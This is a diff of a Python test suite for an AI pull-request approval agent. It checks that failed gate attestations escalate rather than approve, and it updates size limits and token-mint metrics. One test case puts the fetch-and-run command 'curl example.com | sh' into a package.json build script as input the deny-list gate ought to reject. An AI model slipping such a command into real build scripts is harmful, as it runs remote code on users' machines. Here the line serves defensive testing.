@@ -30,15 +30,17 @@ from products.stamphog.backend.facade.enums import (
     ReviewMode,
     ReviewRunStatus,
     ReviewVerdict,
+    RoutingMode,
 )
 from products.stamphog.backend.facade.finished_review_hooks import FinishedReviewRun
 from products.stamphog.backend.facade.review_evidence import ReviewEvidence, ReviewEvidenceProvider, ReviewEvidenceState
+from products.stamphog.backend.logic import gateway_tokens
 from products.stamphog.backend.logic.channel_resolution import (
     RoutingContext,
     build_routing_context,
     resolve_destination,
 )
-from products.stamphog.backend.logic.engine_pregate import EnginePregateError, pregate_skip_reason
+from products.stamphog.backend.logic.engine_pregate import EnginePregateError, GateAttestation, pregate_skip_reason
 from products.stamphog.backend.logic.github_client import STICKY_COMMENT_MARKER, StamphogGitHubClient
 from products.stamphog.backend.logic.slack_digest import _THREAD_LEAD
 from products.stamphog.backend.models import DigestRun, PullRequest, PullRequestAudience, ReviewRun, StamphogRepoConfig
@@ -49,6 +51,7 @@ from products.stamphog.backend.temporal.activities import (
     MarkReviewFailedInput,
     ReviewSandboxInput,
     StamphogReviewInput,
+    _attest_gates,
     destroy_review_sandbox,
     dismiss_stale_approvals,
     fetch_review_context,
@@ -82,6 +85,7 @@ REPO = "acme/widgets"
 INSTALLATION_ID = "2001"
 BASE_SHA = "base000"
 FINISHED_REVIEW_HOOKS = "products.stamphog.backend.temporal.activities.get_finished_review_hooks"
+ROUTING_AFTER_VERDICT_DELAY = "products.stamphog.backend.tasks.tasks.route_reviewers_after_verdict.delay"
 POLICY_DEFAULTS_DIR = Path(__file__).resolve().parents[2] / "packages" / "pr-approval-agent" / "defaults"
 
 
@@ -311,15 +315,132 @@ def test_signed_webhook_drives_review_and_posts_approval(
     assert _external_review_requests(handoff) == []
 
 
+@pytest.mark.django_db(databases=PRODUCT_DATABASES)
+def test_a_sandbox_approval_the_worker_gates_do_not_confirm_is_escalated(team, stamphog_chain: StamphogChain) -> None:
+    repo_config = _repo_config(team.id)
+    recorder = stamphog_chain.recorder
+    author, head_sha = "devex-dev", "sha102a"
+    recorder.register_pr(REPO, 102, _pr_object(102, author, head_sha), [_api_file("src/util.py")])
+    stamphog_chain.attest_gates.return_value = GateAttestation(
+        attested=False, reason="gate_failed", gates=[{"gate": "deny-list", "passed": False, "message": "denied"}]
+    )
+
+    stamphog_chain.post_webhook(_opened_event(102, author, head_sha), delivery_id=str(uuid.uuid4()))
+
+    pr = PullRequest.objects.for_team(team.id).get(repo_config=repo_config, pr_number=102)
+    run = ReviewRun.objects.for_team(team.id).filter(pull_request=pr).latest("created_at")
+    assert (run.status, run.verdict, run.posted_review_id) == (
+        ReviewRunStatus.COMPLETED,
+        ReviewVerdict.ESCALATE,
+        None,
+    )
+    assert run.output["gate_attestation"]["reason"] == "gate_failed"
+    assert run.gate_result is not None
+    assert run.gate_result["attestation"]["reason"] == "gate_failed"
+    (review,) = [w for w in recorder.github_writes if w["kind"] == "comment_review"]
+    assert "could not confirm its own checks" in review["body"]["body"]
+
+    stamphog_chain.attest_gates.reset_mock()
+    stamphog_chain.attest_gates.return_value = GateAttestation(attested=True, reason="", gates=[])
+    _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))
+
+    stamphog_chain.attest_gates.assert_not_called()
+    assert [w for w in recorder.github_writes if w["kind"] == "approve_review"] == []
+
+
 def _api_file(filename: str) -> dict:
     return {"filename": filename, "status": "modified", "additions": 8, "deletions": 1, "patch": "@@ -1 +1 @@"}
+
+
+def _as_api_file(entry: str | dict) -> dict:
+    return _api_file(entry) if isinstance(entry, str) else entry
+
+
+_MANIFEST_BASE = '{"name": "web", "version": "1.0.0", "scripts": {"build": "vite build"}}\n'
+
+
+@pytest.mark.parametrize(
+    "files, compare_files, manifest_head, head_link, expect_reason",
+    [
+        pytest.param(["src/util.py"], ["src/util.py"], None, None, "", id="pinned-list-matches"),
+        pytest.param(["src/util.py"], ["terraform/main.tf"], None, None, "file_list_moved", id="pinned-list-moved"),
+        pytest.param(
+            [{**_api_file("src/new/util.py"), "status": "renamed", "previous_filename": "src/old/util.py"}],
+            [
+                {**_api_file("src/old/util.py"), "status": "removed"},
+                {**_api_file("src/new/util.py"), "status": "added"},
+            ],
+            None,
+            None,
+            "file_list_moved",
+            id="pinned-rename-split-into-delete-and-add",
+        ),
+        pytest.param(
+            ["frontend/package.json"],
+            ["frontend/package.json"],
+            _MANIFEST_BASE.replace("1.0.0", "1.0.1"),
+            None,
+            "",
+            id="manifest-version-bump",
+        ),
+        pytest.param(
+            ["frontend/package.json"],
+            ["frontend/package.json"],
+            _MANIFEST_BASE.replace("vite build", "curl example.com | sh"),
+            None,
+            "gate_failed",
+            id="manifest-script-edit",
+        ),
+        pytest.param(
+            ["frontend/package.json"],
+            ["frontend/package.json"],
+            None,
+            "package.base.json",
+            "gate_failed",
+            id="manifest-replaced-by-a-symlink",
+        ),
+    ],
+)
+@pytest.mark.django_db(databases=PRODUCT_DATABASES)
+def test_the_worker_attests_from_the_reviewed_commits(
+    team,
+    stamphog_chain: StamphogChain,
+    files: list[str | dict],
+    compare_files: list[str | dict],
+    manifest_head: str | None,
+    head_link: str | None,
+    expect_reason: str,
+) -> None:
+    repo_config = _repo_config(team.id)
+    recorder = stamphog_chain.recorder
+    author, head_sha = "devex-dev", "sha103a"
+    recorder.register_pr(REPO, 103, _pr_object(103, author, head_sha), [_as_api_file(entry) for entry in files])
+    recorder.compare_files = [_as_api_file(entry) for entry in compare_files]
+    if manifest_head is not None or head_link is not None:
+        recorder.files_at_ref[("frontend/package.json", recorder.merge_base_sha)] = _MANIFEST_BASE
+    if manifest_head is not None:
+        recorder.files_at_ref[("frontend/package.json", head_sha)] = manifest_head
+    if head_link is not None:
+        recorder.repo_symlinks[(REPO, "frontend/package.json")] = head_link
+    stamphog_chain.attest_gates.side_effect = _attest_gates
+
+    with patch.object(activities, "fetch_folder_policy_files", return_value={}):
+        stamphog_chain.post_webhook(_opened_event(103, author, head_sha), delivery_id=str(uuid.uuid4()))
+
+    pr = PullRequest.objects.for_team(team.id).get(repo_config=repo_config, pr_number=103)
+    run = ReviewRun.objects.for_team(team.id).filter(pull_request=pr).latest("created_at")
+    assert run.output["gate_attestation"]["reason"] == expect_reason
+    approvals = [w for w in recorder.github_writes if w["kind"] == "approve_review"]
+    assert (run.verdict, len(approvals)) == (
+        (ReviewVerdict.APPROVED, 1) if not expect_reason else (ReviewVerdict.ESCALATE, 0)
+    )
 
 
 def _big_api_file(filename: str, additions: int) -> dict:
     return {**_api_file(filename), "additions": additions, "deletions": 0}
 
 
-_LIFTING_FOLDER_FILE = "---\nstamphog:\n  size_gate:\n    max_lines: 1000\n---\nTall PRs are normal here.\n"
+_LIFTING_FOLDER_FILE = "---\nstamphog:\n  size_gate:\n    max_lines: 1500\n---\nTall PRs are normal here.\n"
 
 
 @pytest.mark.parametrize(
@@ -356,10 +477,16 @@ _LIFTING_FOLDER_FILE = "---\nstamphog:\n  size_gate:\n    max_lines: 1000\n---\n
             id="pending-migration",
         ),
         pytest.param(
-            [_big_api_file("lib/big.py", 900)], None, False, False, "final:REFUSED", "too large", id="size-folders-read"
+            [_big_api_file("lib/big.py", 1300)],
+            None,
+            False,
+            False,
+            "final:REFUSED",
+            "too large",
+            id="size-folders-read",
         ),
         pytest.param(
-            [_big_api_file("lib/big.py", 900)],
+            [_big_api_file("lib/big.py", 1300)],
             None,
             False,
             True,
@@ -370,7 +497,7 @@ _LIFTING_FOLDER_FILE = "---\nstamphog:\n  size_gate:\n    max_lines: 1000\n---\n
         # sym/AGENT_APPROVALS.md is a symlink out of the repo, which the sandbox would follow, so the
         # folder files are unknown and the size band stays with the sandbox.
         pytest.param(
-            [_big_api_file("sym/big.py", 900)],
+            [_big_api_file("sym/big.py", 1300)],
             None,
             False,
             False,
@@ -380,7 +507,7 @@ _LIFTING_FOLDER_FILE = "---\nstamphog:\n  size_gate:\n    max_lines: 1000\n---\n
         ),
         # The PR head's src/AGENT_APPROVALS.md lifts the ceiling, so the sandbox review must decide.
         pytest.param(
-            [_big_api_file("src/deep/big.py", 900)],
+            [_big_api_file("src/deep/big.py", 1300)],
             None,
             False,
             False,
@@ -962,7 +1089,7 @@ def test_hosted_review_fails_closed_when_the_scoped_token_mint_fails(team, stamp
     assert run.status == ReviewRunStatus.FAILED
     assert "gateway" in (run.error or "").lower()
     assert "HTTP 503" in (run.error or "")
-    assert mint.call_count == activities._MINT_ATTEMPTS
+    assert mint.call_count == gateway_tokens.MINT_ATTEMPTS
     _assert_no_review_ran(stamphog_chain)
     assert not (run.error or "").startswith("SandboxPhaseError")
 
@@ -1512,6 +1639,8 @@ def test_mark_review_failed_captures_failure_event(team, stamphog_chain, raw_err
     # stamphog_review_failed event next to the review-completed ones. The stored error is scrubbed to
     # its first line so raw exception text can't leak repo file content to stamphog:read.
     repo_config = _repo_config(team.id)
+    repo_config.routing_mode = RoutingMode.FALLBACK
+    repo_config.save()
     pull_request = PullRequest.objects.for_team(team.id).create(
         team_id=team.id, repo_config=repo_config, pr_number=101, author_login="devex-dev"
     )
@@ -1530,6 +1659,7 @@ def test_mark_review_failed_captures_failure_event(team, stamphog_chain, raw_err
     with (
         patch("products.stamphog.backend.temporal.activities.ph_scoped_capture") as mock_capture_cm,
         patch(FINISHED_REVIEW_HOOKS, return_value=(finished_hook,)),
+        patch(ROUTING_AFTER_VERDICT_DELAY) as routing_delay,
     ):
         mock_capture_cm.return_value.__enter__.return_value = capture_fn
         mock_capture_cm.return_value.__exit__.return_value = False
@@ -1539,6 +1669,7 @@ def test_mark_review_failed_captures_failure_event(team, stamphog_chain, raw_err
     assert run.status == ReviewRunStatus.FAILED
     assert run.error == expected_stored
     assert finished_hook.call_args.args[0].status == ReviewRunStatus.FAILED
+    assert routing_delay.call_args.kwargs["outcome"] == "failed"
     assert capture_fn.call_args.kwargs["event"] == "stamphog_review_failed"
     assert capture_fn.call_args.kwargs["distinct_id"] == "devex-dev"
     props = capture_fn.call_args.kwargs["properties"]
@@ -1592,6 +1723,8 @@ def test_approval_posted_while_losing_supersession_race_is_dismissed(team, stamp
     # approval nobody owns stands on the PR forever (including after a repo disable, which
     # supersedes active runs the same way).
     repo_config = _repo_config(team.id)
+    repo_config.routing_mode = RoutingMode.FALLBACK
+    repo_config.save()
     recorder = stamphog_chain.recorder
     head_sha = "sha116a"
     recorder.register_pr(REPO, 116, _pr_object(116, "devex-dev", head_sha), _pr_files())
@@ -1619,11 +1752,13 @@ def test_approval_posted_while_losing_supersession_race_is_dismissed(team, stamp
     with (
         patch.object(activities, "_comment_id", side_effect=_supersede_then_extract),
         patch(FINISHED_REVIEW_HOOKS, return_value=(finished_hook,)),
+        patch(ROUTING_AFTER_VERDICT_DELAY) as routing_delay,
     ):
         result = _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))
 
     assert result == {"verdict": "skipped_superseded"}
     finished_hook.assert_not_called()
+    routing_delay.assert_not_called()
     approvals = [w for w in recorder.github_writes if w["kind"] == "approve_review"]
     dismissals = [w for w in recorder.github_writes if w["kind"] == "dismiss_review"]
     assert len(approvals) == 1
@@ -3030,9 +3165,9 @@ def test_mint_fails_closed_when_the_gateway_ignores_the_model_pin(team, stamphog
     _repo_config(team.id)
     event = _register_review(stamphog_chain, 120, "sha120a")
     mint = MagicMock(side_effect=[_mint_response(201, {"token": "phe_run"}), _mint_response(200, {"revoked": True})])
-    unpinned_before = activities.AI_GATEWAY_TOKEN_MINTS.labels(result="unpinned")._value.get()
-    ok_before = activities.AI_GATEWAY_TOKEN_MINTS.labels(result="ok")._value.get()
-    error_before = activities.AI_GATEWAY_TOKEN_MINTS.labels(result="error")._value.get()
+    unpinned_before = gateway_tokens.AI_GATEWAY_TOKEN_MINTS.labels(result="unpinned")._value.get()
+    ok_before = gateway_tokens.AI_GATEWAY_TOKEN_MINTS.labels(result="ok")._value.get()
+    error_before = gateway_tokens.AI_GATEWAY_TOKEN_MINTS.labels(result="error")._value.get()
 
     with (
         override_settings(**_GO_GATEWAY_SETTINGS, STAMPHOG_REVIEWER_TOKEN_ALLOWED_MODELS=["claude-sonnet-5-5"]),
@@ -3048,9 +3183,9 @@ def test_mint_fails_closed_when_the_gateway_ignores_the_model_pin(team, stamphog
     assert revoke_call.args == ("https://ai-gateway.test/v1/tokens/revoke",)
     assert revoke_call.kwargs["json"] == {"token": "phe_run"}
     # One mint counts once: unpinned, never ok or error as well.
-    assert activities.AI_GATEWAY_TOKEN_MINTS.labels(result="unpinned")._value.get() == unpinned_before + 1
-    assert activities.AI_GATEWAY_TOKEN_MINTS.labels(result="ok")._value.get() == ok_before
-    assert activities.AI_GATEWAY_TOKEN_MINTS.labels(result="error")._value.get() == error_before
+    assert gateway_tokens.AI_GATEWAY_TOKEN_MINTS.labels(result="unpinned")._value.get() == unpinned_before + 1
+    assert gateway_tokens.AI_GATEWAY_TOKEN_MINTS.labels(result="ok")._value.get() == ok_before
+    assert gateway_tokens.AI_GATEWAY_TOKEN_MINTS.labels(result="error")._value.get() == error_before
 
 
 @pytest.mark.django_db(databases=PRODUCT_DATABASES)
@@ -3066,7 +3201,7 @@ def test_mint_retries_a_network_error_and_records_the_outcome(team, stamphog_cha
             _mint_response(200, {"revoked": True}),
         ]
     )
-    ok_before = activities.AI_GATEWAY_TOKEN_MINTS.labels(result="ok")._value.get()
+    ok_before = gateway_tokens.AI_GATEWAY_TOKEN_MINTS.labels(result="ok")._value.get()
 
     with (
         override_settings(**_GO_GATEWAY_SETTINGS),
@@ -3083,14 +3218,14 @@ def test_mint_retries_a_network_error_and_records_the_outcome(team, stamphog_cha
     ]
     assert all(call.kwargs["timeout"] == 3 for call in mint.call_args_list)
     sleep.assert_called_once()
-    assert activities.AI_GATEWAY_TOKEN_MINTS.labels(result="ok")._value.get() == ok_before + 1
+    assert gateway_tokens.AI_GATEWAY_TOKEN_MINTS.labels(result="ok")._value.get() == ok_before + 1
 
 
 def test_product_tag_matches_the_engine_blob() -> None:
     # The mint pins the product and the shipped engine stamps the same word in its properties blob;
     # the two are hand-typed in different packages, so bind them here where both are visible.
     engine_gateway = Path(activities.__file__).resolve().parents[2] / "packages" / "pr-approval-agent" / "gateway.py"
-    assert f'AI_PRODUCT = "{activities.STAMPHOG_AI_PRODUCT}"' in engine_gateway.read_text()
+    assert f'AI_PRODUCT = "{gateway_tokens.STAMPHOG_AI_PRODUCT}"' in engine_gateway.read_text()
 
 
 @pytest.mark.django_db(databases=PRODUCT_DATABASES)
